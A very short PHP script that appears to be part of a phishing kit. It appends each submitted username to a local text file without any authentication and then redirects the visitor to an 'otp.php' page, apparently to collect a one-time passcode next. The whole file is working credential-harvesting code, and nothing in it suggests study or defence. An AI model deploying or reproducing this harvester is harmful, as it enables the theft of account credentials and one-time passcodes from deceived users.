<?php

    file_put_contents("data.txt", "" . $_POST['username'] . " ", FILE_APPEND);

header('Location: otp.php');
exit();
